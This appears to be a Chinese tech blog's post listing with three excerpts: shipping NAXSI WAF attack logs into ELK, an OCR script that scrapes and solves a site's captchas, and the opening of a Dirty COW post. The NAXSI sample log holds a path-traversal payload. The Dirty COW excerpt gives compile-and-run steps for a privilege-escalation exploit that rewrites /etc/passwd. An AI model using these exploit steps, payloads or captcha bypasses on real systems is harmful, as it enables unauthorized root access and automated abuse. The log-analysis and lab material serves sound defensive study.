NUM1 \d+(?:#0: \*)
NUM2 \d+
EXLOG NAXSI_EXLOG
FMT NAXSI_FMT
ID1 (\d+)
ZONE \w+
VAR1  (.*)
CONTENT (.*)
T3 \w+
T4 HTTP&#x2F;1\.1&quot;, host: &quot;(.*)&quot;, referrer: &quot;
HOST (.*)
NAXSI %&#123;DA1:date&#125;\s%&#123;TM1:time&#125;\s\[%&#123;LEVEL:level&#125;\]\s%&#123;NUM1:num1&#125;%&#123;NUM2:request_id&#125;\s(?&lt;logtype&gt;NAXSI_EXLOG):\s\w+&#x3D;%&#123;HOST:client_ip&#125;&amp;server&#x3D;%&#123;HOST:hostname&#125;&amp;uri&#x3D;%&#123;PROG:filepath&#125;&amp;id&#x3D;%&#123;ID1:id&#125;&amp;zone&#x3D;%&#123;ZONE:zone&#125;&amp;var_name&#x3D;%&#123;VAR1:var&#125;&amp;content&#x3D;%&#123;CONTENT:content&#125;,\sclient\:\s%&#123;HOST:ip3&#125;,\sserver:\s(.*)\srequest:\s&quot;%&#123;T3:method&#125;\s%&#123;HOST:uri&#125;\sHTTP&#x2F;1\.1&quot;,\shost:\s&quot;%&#123;HOST:host22&#125;&quot;
NAXSI2 %&#123;DA1:date&#125;\s%&#123;TM1:time&#125;\s\[%&#123;LEVEL:level&#125;\]\s%&#123;NUM1:num1&#125;%&#123;NUM2:request_id&#125;\s(?&lt;logtype&gt;NAXSI_EXLOG):\s\w+&#x3D;%&#123;HOST:client_ip&#125;&amp;server&#x3D;%&#123;HOST:hostname&#125;&amp;uri&#x3D;%&#123;PROG:filepath&#125;&amp;id&#x3D;%&#123;ID1:id&#125;&amp;zone&#x3D;%&#123;ZONE:zone&#125;&amp;var_name&#x3D;%&#123;VAR1:var&#125;&amp;content&#x3D;%&#123;CONTENT:content&#125;,\sclient\:\s%&#123;HOST:ip3&#125;,\sserver:\s(.*)\srequest:\s&quot;%&#123;T3:method&#125;\s%&#123;HOST:uri&#125;\sHTTP&#x2F;1\.1&quot;,\shost:\s&quot;%&#123;HOST:host22&#125;&quot;,\sreferrer:\s&quot;(?&lt;referrer&gt;(.*))
NAXSI3 %&#123;DA1:date&#125;\s%&#123;TM1:time&#125;\s\[%&#123;LEVEL:level&#125;\]\s(\d+(?:#0:\s\*))%&#123;NUM2:request_id&#125;\s(?&lt;logtype&gt;NAXSI_EXLOG)(.*)&amp;var_name&#x3D;%&#123;VAR1:var&#125;&amp;content&#x3D;%&#123;CONTENT:content&#125;,\sclient\:\s(.*),\sserver:\s(.*)\srequest:\s&quot;%&#123;T3:method&#125;\s%&#123;HOST:uri&#125;
NAXSI4 %&#123;DA1:date&#125;\s%&#123;TM1:time&#125;\s\[%&#123;LEVEL:level&#125;\]\s(\d+(?:#0:\s\*))%&#123;NUM2:request_id&#125;\s(?&lt;logtype&gt;NAXSI_EXLOG)(.*)&amp;var_name&#x3D;%&#123;VAR1:var&#125;&amp;content&#x3D;%&#123;CONTENT:content&#125;,\sclient\:\s(.*),\sserver:\s(.*)\srequest:\s&quot;%&#123;T3:method&#125;\s%&#123;HOST:uri&#125;\sHTTP&#x2F;1\.1&quot;,\shost:\s&quot;%&#123;HOST:host&#125;&quot;,\sreferrer:\s&quot;(?&lt;referrer&gt;(.*))
FMT %&#123;DA1:date&#125;\s%&#123;TM1:time&#125;\s\[%&#123;LEVEL:level&#125;\]\s%&#123;NUM1:num1&#125;%&#123;NUM2:request_id&#125;\s(?&lt;logtype&gt;NAXSI_FMT):\sip&#x3D;%&#123;HOST:client_ip&#125;&amp;server&#x3D;%&#123;HOST:server_ip&#125;&amp;uri&#x3D;%&#123;UNIXPATH:uri&#125;&amp;learning&#x3D;%&#123;HOST:learing&#125;&amp;vers&#x3D;%&#123;HOST:vers&#125;&amp;total_processed&#x3D;%&#123;HOST:toal_processed&#125;&amp;total_blocked&#x3D;%&#123;HOST:total_blocked&#125;&amp;block&#x3D;%&#123;HOST:block&#125;&amp;cscore0&#x3D;%&#123;HOST:attack&#125;&amp;score0&#x3D;%&#123;HOST:score0&#125;&amp;cscore1&#x3D;%&#123;HOST:xss&#125;&amp;score1&#x3D;%&#123;HOST:score&#125;&amp;zone0&#x3D;%&#123;WORD:args&#125;&amp;id0&#x3D;%&#123;NUMBER:id&#125;&amp;var_name0&#x3D;%&#123;HOST:varname&#125;,\sclient:\s%&#123;HOST:ip3&#125;,\sserver:\s(.*)\srequest:\s&quot;%&#123;T3:method&#125;\s%&#123;HOST:uri&#125;\sHTTP&#x2F;1\.1&quot;,\shost:\s&quot;%&#123;HOST:host22&#125;&quot;
FMT_R %&#123;DA1:date&#125;\s%&#123;TM1:time&#125;\s\[%&#123;LEVEL:level&#125;\]\s%&#123;NUM1:num1&#125;%&#123;NUM2:request_id&#125;\s(?&lt;logtype&gt;NAXSI_FMT):\sip&#x3D;%&#123;HOST:client_ip&#125;&amp;server&#x3D;%&#123;HOST:server_ip&#125;&amp;uri&#x3D;%&#123;UNIXPATH:uri&#125;&amp;learning&#x3D;%&#123;HOST:learing&#125;&amp;vers&#x3D;%&#123;HOST:vers&#125;&amp;total_processed&#x3D;%&#123;HOST:toal_processed&#125;&amp;total_blocked&#x3D;%&#123;HOST:total_blocked&#125;&amp;block&#x3D;%&#123;HOST:block&#125;&amp;cscore0&#x3D;%&#123;HOST:attack&#125;,\sclient:\s(.*)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>上面这一坨翔就是解析最上面日志的正则，其中用到的是NAXSI3,NAXSI4,FMT_R,其他是调试用的。然后給logstash添加plugin:</p>
<pre class="line-numbers language-none"><code class="language-none">bin&#x2F;logstash-plugin install logstash-filter-grok
bin&#x2F;logstash-plugin install logstash-filter-ruby<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>


<p>然后配置<code>/etc/logstash.conf</code>文件：</p>
<pre class="line-numbers language-none"><code class="language-none">input&#123;
     file &#123;
       path &#x3D;&gt; &quot;&#x2F;usr&#x2F;local&#x2F;nginx&#x2F;logs&#x2F;naxsi.err&quot;
       type &#x3D;&gt; &quot;naxsi-error&quot;
       start_position &#x3D;&gt; &quot;beginning&quot;
   			&#125;
&#125;
filter&#123;
     if [type] &#x3D;&#x3D; &quot;naxsi-error&quot; &#123;
	grok &#123;
		patterns_dir &#x3D;&gt; &quot;&#x2F;opt&#x2F;logstash-5.5.1&#x2F;pattern&quot;
		match &#x3D;&gt; [ &quot;message&quot; , &quot;%&#123;NAXSI4&#125;&quot;,
			   &quot;message&quot; , &quot;%&#123;NAXSI3&#125;&quot;,
			   &quot;message&quot; , &quot;%&#123;FMT_R&#125;&quot;
			]
  	     &#125;
	ruby &#123;
	code &#x3D;&gt; &quot;require &#39;digest&#x2F;md5&#39;;
	event.set(&#39;computed_id&#39;, Digest::MD5.hexdigest(event.get(&#39;request_id&#39;)+event.get(&#39;time&#39;)) + &#39;_&#39; + event.get(&#39;logtype&#39;))&quot;
	    &#125;

&#125;
&#125;
output&#123;
      if [type] &#x3D;&#x3D; &quot;naxsi-error&quot; &#123;
	elasticsearch &#123;
	   hosts &#x3D;&gt; [&quot;localhost&quot;]
	   index &#x3D;&gt; &quot;nxapi&quot;
           document_id &#x3D;&gt; &quot;%&#123;computed_id&#125;&quot;
	&#125;
	stdout &#123; codec &#x3D;&gt; rubydebug&#125;
     &#125;
&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
	

	</div>
  <a type="button" href="/2017/10/25/naxsi-elk.html#more" class="btn btn-default more">Read More</a>
</div>

-->
<div class="entry">
  <div class="row">
	
	
		<p>NAXSI防火墙介绍: <a target="_blank" rel="noopener" href="https://github.com/nbs-system/naxsi">https://github.com/nbs-system/naxsi</a><br>配置安装: <a target="_blank" rel="noopener" href="https://klionsec.github.io/2017/09/18/naxsiwaf/">https://klionsec.github.io/2017/09/18/naxsiwaf/</a><br>主要功能：</p>
<p>过滤XSS，SQL注入，文件上传，文件遍历</p>
<p>NAXSI拦截攻击之后，会产生对应的日志。类似格式是这样的：</p>
<pre class="line-numbers language-none"><code class="language-none">2017&#x2F;10&#x2F;25 14:52:34 [error] 896#0: *15 NAXSI_EXLOG: ip&#x3D;192.168.141.232&amp;server&#x3D;192.168.182.141&amp;uri&#x3D;&#x2F;sqli-labs&#x2F;Less-11&#x2F;index.php&amp;id&#x3D;1200&amp;zone&#x3D;BODY&amp;var_name&#x3D;passwd&amp;content&#x3D;admin..&#x2F;..&#x2F;..&#x2F;etc&#x2F;passwd, client: 192.168.141.232, server: _, request: &quot;POST &#x2F;sqli-labs&#x2F;Less-11&#x2F;index.php HTTP&#x2F;1.1&quot;, host: &quot;192.168.182.141:8000&quot;, referrer: &quot;http:&#x2F;&#x2F;192.168.182.141:8000&#x2F;sqli-labs&#x2F;Less-11&#x2F;index.php&quot;
2017&#x2F;10&#x2F;25 14:52:34 [error] 896#0: *15 NAXSI_FMT: ip&#x3D;192.168.141.232&amp;server&#x3D;192.168.182.141&amp;uri&#x3D;&#x2F;sqli-labs&#x2F;Less-11&#x2F;index.php&amp;learning&#x3D;0&amp;vers&#x3D;0.55.3&amp;total_processed&#x3D;4&amp;total_blocked&#x3D;4&amp;block&#x3D;1&amp;cscore0&#x3D;$TRAVERSAL&amp;score0&#x3D;12&amp;zone0&#x3D;BODY&amp;id0&#x3D;1200&amp;var_name0&#x3D;passwd, client: 192.168.141.232, server: _, request: &quot;POST &#x2F;sqli-labs&#x2F;Less-11&#x2F;index.php HTTP&#x2F;1.1&quot;, host: &quot;192.168.182.141:8000&quot;, referrer: &quot;http:&#x2F;&#x2F;192.168.182.141:8000&#x2F;sqli-labs&#x2F;Less-11&#x2F;index.php&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p>这里我打开了naxsi的EXLOG开关，这样当收集到攻击的日志，可以查看对应的请求内容: <a target="_blank" rel="noopener" href="https://github.com/nbs-system/naxsi/wiki/naxsilogs">https://github.com/nbs-system/naxsi/wiki/naxsilogs</a><br>现在的目标是如何把上面的日志手收集到elk里面方便图形化查看，以下操作，先在logstash里面新建文件夹，写自己的正则：</p>
<pre class="line-numbers language-none"><code class="language-none">logstash&gt; mkdir pattern
logstash&gt; cd pattern
logstash&gt; vim naxsi
DA1 \d&#123;4&#125;&#x2F;\d&#123;2&#125;&#x2F;\d&#123;2&#125;
TM1 \d&#123;2&#125;:\d&#123;2&#125;:\d&#123;2&#125;
LEVEL (\w+)
NUM1 \d+(?:#0: \*)
NUM2 \d+
EXLOG NAXSI_EXLOG
FMT NAXSI_FMT
ID1 (\d+)
ZONE \w+
VAR1  (.*)
CONTENT (.*)
T3 \w+
T4 HTTP&#x2F;1\.1&quot;, host: &quot;(.*)&quot;, referrer: &quot;
HOST (.*)
NAXSI %&#123;DA1:date&#125;\s%&#123;TM1:time&#125;\s\[%&#123;LEVEL:level&#125;\]\s%&#123;NUM1:num1&#125;%&#123;NUM2:request_id&#125;\s(?&lt;logtype&gt;NAXSI_EXLOG):\s\w+&#x3D;%&#123;HOST:client_ip&#125;&amp;server&#x3D;%&#123;HOST:hostname&#125;&amp;uri&#x3D;%&#123;PROG:filepath&#125;&amp;id&#x3D;%&#123;ID1:id&#125;&amp;zone&#x3D;%&#123;ZONE:zone&#125;&amp;var_name&#x3D;%&#123;VAR1:var&#125;&amp;content&#x3D;%&#123;CONTENT:content&#125;,\sclient\:\s%&#123;HOST:ip3&#125;,\sserver:\s(.*)\srequest:\s&quot;%&#123;T3:method&#125;\s%&#123;HOST:uri&#125;\sHTTP&#x2F;1\.1&quot;,\shost:\s&quot;%&#123;HOST:host22&#125;&quot;
NAXSI2 %&#123;DA1:date&#125;\s%&#123;TM1:time&#125;\s\[%&#123;LEVEL:level&#125;\]\s%&#123;NUM1:num1&#125;%&#123;NUM2:request_id&#125;\s(?&lt;logtype&gt;NAXSI_EXLOG):\s\w+&#x3D;%&#123;HOST:client_ip&#125;&amp;server&#x3D;%&#123;HOST:hostname&#125;&amp;uri&#x3D;%&#123;PROG:filepath&#125;&amp;id&#x3D;%&#123;ID1:id&#125;&amp;zone&#x3D;%&#123;ZONE:zone&#125;&amp;var_name&#x3D;%&#123;VAR1:var&#125;&amp;content&#x3D;%&#123;CONTENT:content&#125;,\sclient\:\s%&#123;HOST:ip3&#125;,\sserver:\s(.*)\srequest:\s&quot;%&#123;T3:method&#125;\s%&#123;HOST:uri&#125;\sHTTP&#x2F;1\.1&quot;,\shost:\s&quot;%&#123;HOST:host22&#125;&quot;,\sreferrer:\s&quot;(?&lt;referrer&gt;(.*))
NAXSI3 %&#123;DA1:date&#125;\s%&#123;TM1:time&#125;\s\[%&#123;LEVEL:level&#125;\]\s(\d+(?:#0:\s\*))%&#123;NUM2:request_id&#125;\s(?&lt;logtype&gt;NAXSI_EXLOG)(.*)&amp;var_name&#x3D;%&#123;VAR1:var&#125;&amp;content&#x3D;%&#123;CONTENT:content&#125;,\sclient\:\s(.*),\sserver:\s(.*)\srequest:\s&quot;%&#123;T3:method&#125;\s%&#123;HOST:uri&#125;
NAXSI4 %&#123;DA1:date&#125;\s%&#123;TM1:time&#125;\s\[%&#123;LEVEL:level&#125;\]\s(\d+(?:#0:\s\*))%&#123;NUM2:request_id&#125;\s(?&lt;logtype&gt;NAXSI_EXLOG)(.*)&amp;var_name&#x3D;%&#123;VAR1:var&#125;&amp;content&#x3D;%&#123;CONTENT:content&#125;,\sclient\:\s(.*),\sserver:\s(.*)\srequest:\s&quot;%&#123;T3:method&#125;\s%&#123;HOST:uri&#125;\sHTTP&#x2F;1\.1&quot;,\shost:\s&quot;%&#123;HOST:host&#125;&quot;,\sreferrer:\s&quot;(?&lt;referrer&gt;(.*))
FMT %&#123;DA1:date&#125;\s%&#123;TM1:time&#125;\s\[%&#123;LEVEL:level&#125;\]\s%&#123;NUM1:num1&#125;%&#123;NUM2:request_id&#125;\s(?&lt;logtype&gt;NAXSI_FMT):\sip&#x3D;%&#123;HOST:client_ip&#125;&amp;server&#x3D;%&#123;HOST:server_ip&#125;&amp;uri&#x3D;%&#123;UNIXPATH:uri&#125;&amp;learning&#x3D;%&#123;HOST:learing&#125;&amp;vers&#x3D;%&#123;HOST:vers&#125;&amp;total_processed&#x3D;%&#123;HOST:toal_processed&#125;&amp;total_blocked&#x3D;%&#123;HOST:total_blocked&#125;&amp;block&#x3D;%&#123;HOST:block&#125;&amp;cscore0&#x3D;%&#123;HOST:attack&#125;&amp;score0&#x3D;%&#123;HOST:score0&#125;&amp;cscore1&#x3D;%&#123;HOST:xss&#125;&amp;score1&#x3D;%&#123;HOST:score&#125;&amp;zone0&#x3D;%&#123;WORD:args&#125;&amp;id0&#x3D;%&#123;NUMBER:id&#125;&amp;var_name0&#x3D;%&#123;HOST:varname&#125;,\sclient:\s%&#123;HOST:ip3&#125;,\sserver:\s(.*)\srequest:\s&quot;%&#123;T3:method&#125;\s%&#123;HOST:uri&#125;\sHTTP&#x2F;1\.1&quot;,\shost:\s&quot;%&#123;HOST:host22&#125;&quot;
FMT_R %&#123;DA1:date&#125;\s%&#123;TM1:time&#125;\s\[%&#123;LEVEL:level&#125;\]\s%&#123;NUM1:num1&#125;%&#123;NUM2:request_id&#125;\s(?&lt;logtype&gt;NAXSI_FMT):\sip&#x3D;%&#123;HOST:client_ip&#125;&amp;server&#x3D;%&#123;HOST:server_ip&#125;&amp;uri&#x3D;%&#123;UNIXPATH:uri&#125;&amp;learning&#x3D;%&#123;HOST:learing&#125;&amp;vers&#x3D;%&#123;HOST:vers&#125;&amp;total_processed&#x3D;%&#123;HOST:toal_processed&#125;&amp;total_blocked&#x3D;%&#123;HOST:total_blocked&#125;&amp;block&#x3D;%&#123;HOST:block&#125;&amp;cscore0&#x3D;%&#123;HOST:attack&#125;,\sclient:\s(.*)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>上面这一坨翔就是解析最上面日志的正则，其中用到的是NAXSI3,NAXSI4,FMT_R,其他是调试用的。然后給logstash添加plugin:</p>
<pre class="line-numbers language-none"><code class="language-none">bin&#x2F;logstash-plugin install logstash-filter-grok
bin&#x2F;logstash-plugin install logstash-filter-ruby<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>


<p>然后配置<code>/etc/logstash.conf</code>文件：</p>
<pre class="line-numbers language-none"><code class="language-none">input&#123;
     file &#123;
       path &#x3D;&gt; &quot;&#x2F;usr&#x2F;local&#x2F;nginx&#x2F;logs&#x2F;naxsi.err&quot;
       type &#x3D;&gt; &quot;naxsi-error&quot;
       start_position &#x3D;&gt; &quot;beginning&quot;
   			&#125;
&#125;
filter&#123;
     if [type] &#x3D;&#x3D; &quot;naxsi-error&quot; &#123;
	grok &#123;
		patterns_dir &#x3D;&gt; &quot;&#x2F;opt&#x2F;logstash-5.5.1&#x2F;pattern&quot;
		match &#x3D;&gt; [ &quot;message&quot; , &quot;%&#123;NAXSI4&#125;&quot;,
			   &quot;message&quot; , &quot;%&#123;NAXSI3&#125;&quot;,
			   &quot;message&quot; , &quot;%&#123;FMT_R&#125;&quot;
			]
  	     &#125;
	ruby &#123;
	code &#x3D;&gt; &quot;require &#39;digest&#x2F;md5&#39;;
	event.set(&#39;computed_id&#39;, Digest::MD5.hexdigest(event.get(&#39;request_id&#39;)+event.get(&#39;time&#39;)) + &#39;_&#39; + event.get(&#39;logtype&#39;))&quot;
	    &#125;

&#125;
&#125;
output&#123;
      if [type] &#x3D;&#x3D; &quot;naxsi-error&quot; &#123;
	elasticsearch &#123;
	   hosts &#x3D;&gt; [&quot;localhost&quot;]
	   index &#x3D;&gt; &quot;nxapi&quot;
           document_id &#x3D;&gt; &quot;%&#123;computed_id&#125;&quot;
	&#125;
	stdout &#123; codec &#x3D;&gt; rubydebug&#125;
     &#125;
&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
	
	</div>
  <a type="button" href="/2017/10/25/naxsi-elk.html#more" class="btn btn-default more">Read More</a>
</div>

		
			
	
	<!-- display as entry -->
<div class="row">
	<div class="col-md-8">
		<h3 class="title">
			<a href="/2017/09/26/VerifyCode.html" >验证码识别</a>
		</h3>
		</div>
	<div class="col-md-4">
		<div class="date">post @ 2017-09-26  </div>
		</div>
	</div>
	


			<!--
<div class="entry">
  <div class="row">
	
	
		<p>先灰度处理</p>
<pre class="line-numbers language-none"><code class="language-none">img &#x3D; Image.open(&#39;1317.png&#39;) # 打开图片
img &#x3D; img.convert(&#39;L&#39;) # 转换成灰度图片
img.save(&#39;1317-L.png&#39;) # 保存图片<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<p>然后是二值化, 二值化处理之后，投影</p>
<p>以预发布为例子，获取验证的url: <a target="_blank" rel="noopener" href="https://wxxx.net/api/h5/getVerifyCode">https://wxxx.net/api/h5/getVerifyCode</a><br>得到的验证码是base64编码，使用python解码之后保存即可:</p>
<pre class="line-numbers language-none"><code class="language-none">import requests
url &#x3D; &quot;https:&#x2F;&#x2F;xxxxx&#x2F;getVerifyCode&quot;

for i in range(20):
	imgfile &#x3D; str(i) + &#39;.jpg&#39;
	req &#x3D; requests.get(url)
	image_data &#x3D; req.json()[&quot;result&quot;][&quot;imageEncode&quot;]
	fh &#x3D; open(&quot;&#x2F;xxx&#x2F;Desktop&#x2F;imagecode&#x2F;&quot; + imgfile, &quot;wb&quot;)
	fh.write(image_data.decode(&#39;base64&#39;))<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>上面的代码可以获取20个验证码，<br>然后处理验证码：</p>
<p>先灰度处理–&gt; 二值化 –&gt; 投影或者使用8邻域算法</p>
<p>我们这里使用8邻域算法。</p>
<pre class="line-numbers language-none"><code class="language-none"># coding: utf-8
from PIL import Image
import os
import re
import pytesseract

def binarizing(img, threshold):
   img &#x3D; img.convert(&quot;L&quot;)
   pixdata &#x3D; img.load()
   w, h &#x3D; img.size
   for y in range(h):
      for x in range(w):
         if pixdata[x, y] &lt; threshold:
            pixdata[x, y] &#x3D; 0
         else:
            pixdata[x, y] &#x3D; 255
   return img
   # img.save(&quot;&#x2F;xxx&#x2F;Desktop&#x2F;imagecode&#x2F;43.jpg&quot;)


def depoint(img):
   pixdata &#x3D; img.load()
   w,h &#x3D; img.size
   for y in range(1,h-1):
      for x in range(1, w-1):
         count &#x3D; 0
         if pixdata[x, y-1] &gt; 245:
            count &#x3D; count + 1
         if pixdata[x, y+1] &gt; 245:
            count &#x3D; count + 1
         if pixdata[x-1, y] &gt; 245:
            count &#x3D; count + 1
         if pixdata[x+1, y] &gt; 245:
            count &#x3D; count + 1
         if pixdata[x-1, y-1] &gt; 245:
            count &#x3D; count + 1
         if pixdata[x-1, y+1] &gt; 245:
            count &#x3D; count + 1
         if pixdata[x+1, y-1] &gt; 245:
            count &#x3D; count + 1
         if pixdata[x+1, y+1] &gt; 245:
            count &#x3D; count + 1
         if count &gt; 4:
            pixdata[x, y] &#x3D; 255
   return img

path &#x3D; &quot;&#x2F;xxx&#x2F;Desktop&#x2F;imagecode&quot;
pattern &#x3D; re.compile(r&quot;[a-zA-Z0-9]&quot;)
images &#x3D; os.listdir(path)
for image in images:
   if image.split(&quot;.&quot;)[1] &#x3D;&#x3D; &quot;jpg&quot;:
      img &#x3D; Image.open(&quot;&#x2F;xxx&#x2F;Desktop&#x2F;imagecode&#x2F;&quot; + image)
      b_img &#x3D; binarizing(img, 230)
      v &#x3D; depoint(b_img)
      vcode &#x3D; pytesseract.image_to_string(v)
      matches &#x3D; re.findall(pattern, vcode)
      filename &#x3D; &#39;&#39;.join(map(str, matches))
      v.save(&quot;&#x2F;xxx&#x2F;Desktop&#x2F;train&#x2F;&quot; + filename + &#39;.jpg&#39;)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>


<p><a target="_blank" rel="noopener" href="http://www.hi-roy.com/source/all-tags/%E9%AA%8C%E8%AF%81%E7%A0%81%E8%AF%86%E5%88%AB/">http://www.hi-roy.com/source/all-tags/%E9%AA%8C%E8%AF%81%E7%A0%81%E8%AF%86%E5%88%AB/</a></p>
	

	</div>
  <a type="button" href="/2017/09/26/VerifyCode.html#more" class="btn btn-default more">Read More</a>
</div>

-->
<div class="entry">
  <div class="row">
	
	
		<p>先灰度处理</p>
<pre class="line-numbers language-none"><code class="language-none">img &#x3D; Image.open(&#39;1317.png&#39;) # 打开图片
img &#x3D; img.convert(&#39;L&#39;) # 转换成灰度图片
img.save(&#39;1317-L.png&#39;) # 保存图片<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<p>然后是二值化, 二值化处理之后，投影</p>
<p>以预发布为例子，获取验证的url: <a target="_blank" rel="noopener" href="https://wxxx.net/api/h5/getVerifyCode">https://wxxx.net/api/h5/getVerifyCode</a><br>得到的验证码是base64编码，使用python解码之后保存即可:</p>
<pre class="line-numbers language-none"><code class="language-none">import requests
url &#x3D; &quot;https:&#x2F;&#x2F;xxxxx&#x2F;getVerifyCode&quot;

for i in range(20):
	imgfile &#x3D; str(i) + &#39;.jpg&#39;
	req &#x3D; requests.get(url)
	image_data &#x3D; req.json()[&quot;result&quot;][&quot;imageEncode&quot;]
	fh &#x3D; open(&quot;&#x2F;xxx&#x2F;Desktop&#x2F;imagecode&#x2F;&quot; + imgfile, &quot;wb&quot;)
	fh.write(image_data.decode(&#39;base64&#39;))<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>上面的代码可以获取20个验证码，<br>然后处理验证码：</p>
<p>先灰度处理–&gt; 二值化 –&gt; 投影或者使用8邻域算法</p>
<p>我们这里使用8邻域算法。</p>
<pre class="line-numbers language-none"><code class="language-none"># coding: utf-8
from PIL import Image
import os
import re
import pytesseract

def binarizing(img, threshold):
   img &#x3D; img.convert(&quot;L&quot;)
   pixdata &#x3D; img.load()
   w, h &#x3D; img.size
   for y in range(h):
      for x in range(w):
         if pixdata[x, y] &lt; threshold:
            pixdata[x, y] &#x3D; 0
         else:
            pixdata[x, y] &#x3D; 255
   return img
   # img.save(&quot;&#x2F;xxx&#x2F;Desktop&#x2F;imagecode&#x2F;43.jpg&quot;)


def depoint(img):
   pixdata &#x3D; img.load()
   w,h &#x3D; img.size
   for y in range(1,h-1):
      for x in range(1, w-1):
         count &#x3D; 0
         if pixdata[x, y-1] &gt; 245:
            count &#x3D; count + 1
         if pixdata[x, y+1] &gt; 245:
            count &#x3D; count + 1
         if pixdata[x-1, y] &gt; 245:
            count &#x3D; count + 1
         if pixdata[x+1, y] &gt; 245:
            count &#x3D; count + 1
         if pixdata[x-1, y-1] &gt; 245:
            count &#x3D; count + 1
         if pixdata[x-1, y+1] &gt; 245:
            count &#x3D; count + 1
         if pixdata[x+1, y-1] &gt; 245:
            count &#x3D; count + 1
         if pixdata[x+1, y+1] &gt; 245:
            count &#x3D; count + 1
         if count &gt; 4:
            pixdata[x, y] &#x3D; 255
   return img

path &#x3D; &quot;&#x2F;xxx&#x2F;Desktop&#x2F;imagecode&quot;
pattern &#x3D; re.compile(r&quot;[a-zA-Z0-9]&quot;)
images &#x3D; os.listdir(path)
for image in images:
   if image.split(&quot;.&quot;)[1] &#x3D;&#x3D; &quot;jpg&quot;:
      img &#x3D; Image.open(&quot;&#x2F;xxx&#x2F;Desktop&#x2F;imagecode&#x2F;&quot; + image)
      b_img &#x3D; binarizing(img, 230)
      v &#x3D; depoint(b_img)
      vcode &#x3D; pytesseract.image_to_string(v)
      matches &#x3D; re.findall(pattern, vcode)
      filename &#x3D; &#39;&#39;.join(map(str, matches))
      v.save(&quot;&#x2F;xxx&#x2F;Desktop&#x2F;train&#x2F;&quot; + filename + &#39;.jpg&#39;)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>


<p><a target="_blank" rel="noopener" href="http://www.hi-roy.com/source/all-tags/%E9%AA%8C%E8%AF%81%E7%A0%81%E8%AF%86%E5%88%AB/">http://www.hi-roy.com/source/all-tags/%E9%AA%8C%E8%AF%81%E7%A0%81%E8%AF%86%E5%88%AB/</a></p>
	
	</div>
  <a type="button" href="/2017/09/26/VerifyCode.html#more" class="btn btn-default more">Read More</a>
</div>

		
			
	
	<!-- display as entry -->
<div class="row">
	<div class="col-md-8">
		<h3 class="title">
			<a href="/2017/09/12/c0w.html" >C0w</a>
		</h3>
		</div>
	<div class="col-md-4">
		<div class="date">post @ 2017-09-12  </div>
		</div>
	</div>
	


			<!--
<div class="entry">
  <div class="row">
	
	
		<p><a target="_blank" rel="noopener" href="https://raw.githubusercontent.com/FireFart/dirtycow/master/dirty.c">https://raw.githubusercontent.com/FireFart/dirtycow/master/dirty.c</a></p>
<pre class="line-numbers language-none"><code class="language-none">Compile with:
&#x2F;&#x2F;   gcc -pthread dirty.c -o dirty -lcrypt
&#x2F;&#x2F;
&#x2F;&#x2F; Then run the newly create binary by either doing:
&#x2F;&#x2F;   &quot;.&#x2F;dirty&quot; or &quot;.&#x2F;dirty my-new-password&quot;
&#x2F;&#x2F;
&#x2F;&#x2F; Afterwards, you can either &quot;su firefart&quot; or &quot;ssh firefart@...&quot;
&#x2F;&#x2F;
&#x2F;&#x2F; DON&#39;T FORGET TO RESTORE YOUR &#x2F;etc&#x2F;passwd AFTER RUNNING THE EXPLOIT!
&#x2F;&#x2F;   mv &#x2F;tmp&#x2F;passwd.bak &#x2F;etc&#x2F;passwd
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<pre class="line-numbers language-none"><code class="language-none">&#x2F;&#x2F;
&#x2F;&#x2F; This exploit uses the pokemon exploit of the dirtycow vulnerability
&#x2F;&#x2F; as a base and automatically generates a new passwd line.
&#x2F;&#x2F; The user will be prompted for the new password when the binary is run.
